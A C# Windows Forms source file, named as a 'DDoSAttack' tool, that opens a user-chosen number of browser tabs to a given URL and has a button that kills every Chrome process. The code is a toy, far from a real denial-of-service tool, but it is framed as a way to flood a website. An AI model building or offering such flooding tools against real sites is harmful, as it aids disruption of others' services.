using System.Diagnostics;

namespace DDoSAttack
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void numOfBrowswers_TextChanged(object sender, EventArgs e)
        {

        }

        //attack
        private void Start_Click(object sender, EventArgs e)
        {
           
            int numberOfBrowsers = GetNumberOfBrowsers();
            if (numberOfBrowsers <= 0)
                return;

            string url = GetValidUrl();
            if (string.IsNullOrEmpty(url))
                return;

            
            OpenBrowsers(numberOfBrowsers, url);
        }

               private int GetNumberOfBrowsers()
        {
            int numberOfBrowsers;
            if (!int.TryParse(numOfBrowswers.Text, out numberOfBrowsers) || numberOfBrowsers <= 0)
            {
                MessageBox.Show("Please enter a valid positive number for the number of browsers.");
                return -1; 
            }
            return numberOfBrowsers;
        }

                private string GetValidUrl()
        {
            string url = theURL.Text;

            if (string.IsNullOrWhiteSpace(url))
            {
                MessageBox.Show("Please enter a valid URL.");
                return null;
            }

          
            if (!url.StartsWith("http://") && !url.StartsWith("https://"))
            {
                url = "http://" + url; 
            }

            return url;
        }

       
        private void OpenBrowsers(int numberOfBrowsers, string url)
        {
            try
            {
                for (int i = 0; i < numberOfBrowsers; i++)
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = url,
                        UseShellExecute = true
                    });
                }
                MessageBox.Show("All tabs opened successfully.");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to open the website: " + ex.Message);
            }
        }

        private void theURL_TextChanged(object sender, EventArgs e)
        {

        }

 
        private void colseAll_Click(object sender, EventArgs e)
        {
            var processesToClose = Process.GetProcessesByName("chrome");

            if (processesToClose.Length == 0)
            {
                MessageBox.Show("No Chrome tabs found to close.");
                return;
            }

            try
            {
                foreach (var process in processesToClose)
                {
                    process.Kill();
                }
                MessageBox.Show("All Chrome tabs closed successfully.");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to close some tabs: " + ex.Message);
            }
        }

    }
}

